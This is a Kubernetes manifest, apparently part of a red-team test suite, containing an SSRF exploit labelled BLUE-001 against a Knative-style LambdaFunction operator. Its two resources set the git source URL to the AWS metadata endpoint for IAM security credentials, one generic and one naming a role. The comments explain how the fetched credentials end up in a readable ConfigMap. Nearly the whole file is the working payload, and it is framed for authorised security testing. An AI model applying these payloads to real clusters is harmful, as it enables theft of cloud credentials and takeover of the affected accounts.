# BLUE-001: SSRF via Go-Git - AWS Metadata Endpoint
# ⚠️ AUTHORIZED TESTING ONLY
#
# This exploit attempts to retrieve AWS IAM credentials via SSRF
# by providing the AWS metadata endpoint as the Git URL.
#
# Attack Flow:
# 1. Create LambdaFunction with git.url pointing to AWS metadata
# 2. Operator's go-git library attempts to "clone" the URL
# 3. HTTP request made to 169.254.169.254
# 4. Response stored in build context ConfigMap
# 5. Attacker reads ConfigMap to get IAM credentials
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: blue-001-aws-metadata-ssrf
  labels:
    redteam: "true"
    exploit: "blue-001"
    target: "aws-metadata"
  annotations:
    redteam.knative.io/description: "SSRF to AWS metadata endpoint"
    redteam.knative.io/expected-result: "IAM credentials in build context"
spec:
  source:
    type: git
    git:
      # SSRF payload - AWS metadata endpoint
      # IMDSv1: Direct access without token
      url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
      ref: "main"
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
---
# Alternate payload for IMDSv2 (requires token)
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: blue-001-aws-metadata-ssrf-v2
  labels:
    redteam: "true"
    exploit: "blue-001"
    target: "aws-metadata-v2"
spec:
  source:
    type: git
    git:
      # Target a role name if known
      url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/lambda-execution-role"
      ref: "main"
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
